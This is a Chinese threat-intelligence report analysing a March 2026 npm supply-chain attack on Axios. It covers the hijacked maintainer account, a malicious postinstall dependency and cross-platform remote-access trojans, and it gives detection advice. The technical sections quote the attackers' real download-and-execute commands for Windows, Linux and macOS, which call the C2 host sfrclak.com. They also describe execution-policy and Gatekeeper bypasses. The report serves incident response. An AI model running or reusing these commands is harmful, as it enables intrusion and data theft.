---
title: Axios npm供应链攻击威胁分析报告
url: https://mp.weixin.qq.com/s/vEdfRB0iKon0uMXOdfxb-Q
source: Doonsec's feed
date: 2026-03-31
fetch_date: 2026-04-01T04:44:40.260258
---

# Axios npm供应链攻击威胁分析报告

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Emmib7pWXrXKoyIvgDwOMbZNL5Z5k3frLbOY8swdibicqiboCMaoia8kEBAuWvkBwbMLa7LmB7tqcJLGFDJxRJOJQejY1zObFjzFRPlLzGKqwaL0/0?wx_fmt=jpeg)

# Axios npm供应链攻击威胁分析报告

360威胁情报中心

![]()

在小说阅读器中沉浸阅读

2026年3月31日，npm生态中广泛使用的JavaScript HTTP客户端库Axios遭受供应链攻击。攻击者通过劫持合法维护者账号jasonsaayman，在未修改任何仓库源代码的情况下，仅在package.json中注入了恶意二次依赖 plain-crypto-js@4.2.1实施攻击。该依赖的 postinstall 生命周期钩子会在安装阶段自动执行，下载并部署跨平台远控木马（RAT），覆盖macOS/Windows/Linux。

本次攻击采用“幽灵依赖 + 诱饵版本 + 自清理”策略，能够在不触发常规源码差异检查的情况下完成投毒，并在短时间内完成发布、感染与下线。恶意版本axios@1.14.1与axios@0.30.4的存活时间均不足3小时，已被npm官方紧急下架。

\*风险提醒\*

任何在2026年3月31日北京时间08:21之后执行npm install的环境，若依赖范围为1.14.0或0.30.0，均可能已遭感染。建议立即执行版本锁定、环境审计、IOC 扫描与凭证轮换。

一、事件背景

Axios是npm生态中下载量最高的包之一，周下载量超过1亿次，直接或间接依赖项目超过17.4万个。攻击者通过npm发布凭证劫持实现投毒，未对GitHub仓库源码进行任何改动，仅利用postinstall生命周期钩子完成后门植入。

该攻击手法与近年来多起npm供应链事件高度一致：

* 基础组件维护者账号安全（MFA/Token 管控）的关键性；
* 安装脚本（preinstall/install/postinstall）在默认执行策略下的固有风险；
* 仅依赖“源码审计/差异对比”的安全策略存在盲区。

二、详细攻击时间线

1. 2026-03-30 13:57，发布plain-crypto-js@4.2.0（干净诱饵版本），用于建立发布历史与可信度；
2. 2026-03-31 00:03:46，恶意C2域名 sfrclak.com 完成注册；
3. 2026-03-31 07:59，发布plain-crypto-js@4.2.1（恶意版本，植入 postinstall 钩子）；
4. 2026-03-31 08:21，发布axios@1.14.1（主版本），自动依赖恶意包并注入 RAT（回连 sfrclak.com:8000）；
5. 2026-03-31 09:00，发布axios@0.30.4（0.x 分支版本），同样植入后门；
6. 2026-03-31 10:35，开发者社区及厂商开始大规模警报传播；
7. 2026-03-31 11:15，npm官方紧急下线两个恶意Axios版本；
8. 2026-03-31 12:26，npm为plain-crypto-js发布安全占位版本，阻断攻击链。

三、技术分析

3.1 攻击手法概览

•初始访问：劫持npm维护者账号jasonsaayman，将联系邮箱修改为ifstap@proton.me（用于接收通知/找回/验证）。

•执行：仅修改 package.json，注入“源码中未引用”的幽灵依赖plain-crypto-js@^4.2.1，并移除 prepare 脚本以降低构建阶段暴露。

•持久化与自清理：postinstall执行混淆的setup.js，按平台下载payload，随后主动覆盖自身package.json为干净版本并删除临时痕迹。

•命令与控制（C2）：http://sfrclak.com:8000/6202033（IP：142.11.206.73），仅支持 POST 请求，User-Agent 伪装为旧版 IE，约每 60 秒 beacon 通联。

3.2 混淆技术（setup.js）分析

setup.js 采用多层混淆（Base64 + 字符反转 + XOR 加密等），解混淆后可见 child\_process、os、fs、http 等模块调用与平台判断逻辑，用于分发不同平台的后续载荷并执行落地。

3.3 平台特定 Payload 行为概览

三个平台的荷载虽然用三种语言写的，但是在代码结构上几乎一模一样，疑似使用AI生成。

|  |  |  |  |
| --- | --- | --- | --- |
| 平台 | 典型部署位置 | 典型执行方式 | 主要行为 |
| macOS | /Library/Caches/com.apple.act.mond | AppleScript → zsh | 下载 payload、清理临时目录、自删除 |
| Windows | %PROGRAMDATA%\wt.exe | VBScript → PowerShell | 隐藏窗口执行、持久化、远控通联 |
| Linux | /tmp/ld.py | nohup python3 | 后台 RAT、痕迹擦除 |

3.4 Windows PowerShell Payload分析

本节对 Windows 阶段载荷（PowerShell 远控木马）的行为分析，用于支撑 已感染主机的取证、检测与响应。

3.4.1 载荷拉取与执行链

攻击者将PowerShell解释器/二进制复制到 %PROGRAMDATA%\wt.exe，随后通过 curl 从 C2 拉取下一阶段 6202033.ps1 并以隐藏窗口方式执行。执行完成后删除临时脚本以降低取证可见性。

关键命令（示例）：

curl -s-X POST -d"packages.npm.org/product1""http://sfrclak.com:8000/6202033">"%UserProfile%\AppData\Local\Temp\6202033.ps1" \
&"C:\ProgramData\wt.exe" -w hidden -ep bypass -file"%UserProfile%\AppData\Local\Temp\6202033.ps1""http://sfrclak.com:8000/6202033" \
&del"%UserProfile%\AppData\Local\Temp\6202033.ps1"/f

要点：

•C2 地址通过脚本参数传入（便于复用同一载荷投递不同节点）

•-ep bypass 绕过PowerShell执行策略

•下载—执行—删除形成短链路落地

3.4.2 功能模块与关键行为

该PowerShell载荷为远控木马，核心能力包括：

1) 持续驻留：将PowerShell命令保存为批处理文件并写入注册表Run启动项实现自启动。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Emmib7pWXrXKmcZ106HYsSeZOZqvPIkibG980Qp9HCGoXTgeSG0CL2aQmnngVa9RC6PluPYFM5iaX1P3m6vbyGNvwxqMI8QlhvEwCETuPAfYp0/640?wx_fmt=png)![]()

2)文件遍历与信息回传：遍历 %USERPROFILE%\Documents、Desktop、OneDrive、AppData\Roaming 等目录，并扩展遍历所有盘符，收集文件清单后回传 C2。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Emmib7pWXrXIy8HSEkxHdC51OibibJUHNLmMJHonkQF30VS9ch5FdDNXyhfNvUB5ZGuSlaxJ6Pqs9NKdoR58s4RTXUrxzkrkWwId3R8pWQiaEHw/640?wx_fmt=png)![]()

3)环境探测：回传运行进程列表、用户名、机器名、操作系统版本/类型、安装时间、时区、启动时间与当前时间、硬件型号等基础信息。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Emmib7pWXrXLIEswQeY4zklOsnibv9DCib2iapKqF1vEKWGIaWMuRaajv7dlG93ockw2Ta5PT0WnwT1g2W7qYeic22QvDjRujiaKXMBP0tRiayDzuo/640?wx_fmt=png)![]()

4)反射注入（peinject）：当C2下发 type=peinject 指令时，载荷将下发的 shellcode 或 DLL 以反射方式注入至当前进程，实现内存驻留与更强的对抗能力。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Emmib7pWXrXJnYN0uEJ7ibj64AGQacGQ5fSeh9ERThf4RVumVlFHROwA8FfUgTuochgDjxGTctxe2gURzbJNw0w5pyLqxgb178V4BTPgfnicTQ/640?wx_fmt=png)![]()

5)脚本执行（runscript）：当C2下发type=runscript指令时，执行其携带的脚本内容并回传结果。

![](https://mmbiz.qpic.cn/mmbiz_png/Emmib7pWXrXJP1yicFEU7Wic79vthm4WLYj2KNSSwJuYTFSB8EShlfg8tmVwU2af5aF1T6FtoYqibMF088WFLJ6Q0G485ibmqhlm9RP1hicWtUXPE/640?wx_fmt=png)![]()![]()![]()

6)指定目录遍历（rundir）：当C2下发type=rundir指令时，遍历下发数据中指定目录并回传枚举结果。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Emmib7pWXrXKGmCwnESeyOvSeZ81FcjNmqp2jh9s1YIktOcDNKA2xc18YFFVdFbfGiapUuG25oprw7dxVKotCyAPjO08Ufrcr8G1AwRabwADg/640?wx_fmt=png)![]()

3.4.3 检测与响应方法

•网络侧：重点关注对sfrclak.com:8000的POST出站通信与周期性beacon特征。

•主机侧：

–注册表 HKCU\Software\Microsoft\Windows\CurrentVersion\Run 中的异常启动项（启动项名：MicrosoftUpdate）

–%PROGRAMDATA% 目录下可疑批处理与可执行文件（如 wt.exe / system.bat）

–临时目录中 6202033.ps1 的短时出现（结合 EDR/审计日志回溯）

3.5 Linux Python Payload 分析

本节对 Linux 阶段载荷（Python 远控木马）的行为分析，重点说明其在 Linux 环境下的落地方式与相较 Windows 载荷的行为差异，用于支撑主机侧排查与应急响应。

3.5.1 载荷拉取与执行链

当攻击目标为 Linux 操作系统时，攻击链通常通过 /bin/sh 直接调用 curl 从 C2 下载 Python 脚本并在后台执行：

/bin/sh-c"curl -o /tmp/ld.py -d packages.npm.org/product2 -s http://sfrclak.com:8000/6202033 && nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &"

要点：

•载荷落地路径为 /tmp/ld.py，并通过 nohup 后台运行，输出重定向到 /dev/null 以降低运行痕迹。

•C2 地址同样通过脚本参数传入（便于同一载荷复用与动态切换 C2）。

3.5.2 与Windows载荷的关键差异

综合样本行为可见，该 Linux Python 远控木马整体功能与 Windows PowerShell 载荷基本一致（信息探测、目录遍历、命令执行与回传等），但在两类指令上存在关键差别：

1)peinject 指令处理差异：Linux 侧不使用反射注入，而是将 C2 下发的 shellcode 保存为临时可执行文件，赋予执行权限后直接启动。

![](https://mmbiz.qpic.cn/mmbiz_png/Emmib7pWXrXIGKj82Qo57mTm5hIpBticib5iaA7zxydouBiaBhlxAgCC5uYTXor2ts2wpCgIsGSLT0VYicTl4bRf6UHbFn2LVdiaxaehNiaJPQOzNHM/640?wx_fmt=png)![]()

2)runscript 指令处理差异：Linux 侧倾向于使用反弹 shell（reverse shell）方式建立交互通道，而非在本地直接执行脚本文本并回传执行结果。

![](https://mmbiz.qpic.cn/mmbiz_png/Emmib7pWXrXKAiaOTCfibMEEhbnh9gvgX8ia3Q2HoLD7pT5riczbic6fPfMRcbGHtJrA5rCnvgFc6tialQsGc61E5IhkTHw3rmmqcEdUTAzVV1mAiaQ/640?wx_fmt=png)![]()![]()![]()

3.5.3 检测与响应方式

•网络侧：

–关注对 sfrclak.com:8000 的 POST 出站通信（与 Windows 类似）。

–若出现反弹 shell 行为，需结合出口策略与 IDS/NetFlow 进一步排查异常外联。

•主机侧：

–/tmp/ld.py 的创建与执行链（curl → python3 → nohup）

–/tmp/.<随机> 形式的可疑临时可执行文件（用于承载下发的 shellcode 并执行）

–关联进程树特征：sh/bash 拉起 curl 与 python3，并存在长期驻留的 Python 进程

3.6  macOS Payload 分析

本节对 macOS 阶段载荷（落地文件：/Library/Caches/com.apple.act.mond）的行为分析，重点关注其在 macOS 环境下的**落地执行链**与针对 Gatekeeper 的**绕过策略**，用于支撑终端侧排查与应急响应。

3.6.1 载荷拉取与执行链

针对 macOS 目标时，攻击者通过 curl 从 C2 下载载荷并保存到 /Library/Caches/com.apple.act.mond 路径，随后赋权并触发执行。

curl -o "/Library/Caches/com.apple.act.mond"-d"packages.npm.org/product0"-shttp://sfrclak.com:8000/6202033 \
&&chmod 770 "/Library/Caches/com.apple.act.mond"\
  &&/bin/zsh-c"/Library/Caches/com.apple.act.mond \"packages.npm.org/product0\""\
  > /dev/null 2>&1&

**要点**：

* 载荷落地于 ~/ 之外的系统缓存目录（/Library/Caches），更贴近“系统组件”伪装。

* 输出重定向到 /dev/null 并后台运行，降低可见性。

3.6.2 与 Windows/Linux 载荷的关键差异

样本整体功能与 Windows PowerShell / Linux Python 版本基本一致，但在两类指令处理上体现出 macOS 平台特性：

1)**peinject****指令处理差异（Gatekeeper****绕过）**：收到 peinject 指令后，会在 /private/tmp/ 写入随机文件名的临时可执行文件，写入 C2 下发的 shellcode，并通过 codesign --force --deep --sign - 进行签名处理，以提高执行成功率并规避部分 Gatekeeper 校验路径。

![macOS peinject与codesign绕过](https://mmbiz.qpic.cn/mmbiz_png/Emmib7pWXrXKBXlpjSbbXb45xMp5uh4JIC1YL3WVADH3qb8oZOvJib9QvjPy3vnRc5BfVCQm5TR7mQvcp8HRQ71JMaXsft1Ce0t4k62zkoo8E/640?wx_fmt=png&from=appmsg)![]()![]()![]()

2)**runscript****指令处理差异（osascript****执行）**：收到 runscript 指令后，会创建形如 /tmp/.XXXXXX.scpt 的临时脚本文件，并使用 /usr/bin/osascript 执行 AppleScript 内容。

![macOS runscript与osascript执行](https://mmbiz.qpic.cn/mmbiz_png/Emmib7pWXrXJH0ebx9o0BoaIRNMfegYGLNFBSOiaicN4ibSrKUuM0O10qkS1a0RSH1h37K6lYQbjZt9zNzf6ZomYuZPocxibXjcaE12oqURw9crI/640?wx_fmt=png&from=appmsg)![]()![]()![]()

3.6.3 检测与响应方式

* **网络侧**：

关注对 sfrclak.com:8000 的 POST 出站通信与周期性 beacon（与其他平台一致）。

* **主机侧**：

–/Library/Caches/com.apple.act.mond的创建、权限变更（chmod）与执行（zsh -c）；

–/private/tmp/ 下随机文件名的短时可执行文件（配合 codesign 命令调用）；

–/tmp/.XXXXXX.scpt 与 /usr/bin/osascript 的异常调用链。

四、影响评估

* 受影响范围：直接/间接依赖 axios@^1.14.0 或 axios@^0.30.0 的所有项目（包括 CI/CD 流水线、构建服务器与开发机）。

* 潜在后果：系统信息窃取、凭证泄露、远程命令执行、跨平台持久化后门、进一步横向移动。

* 当前状态：恶意版本已被 npm 下架，但已安装环境需视为已失陷并按入侵处置流程处理。

五、缓解措施...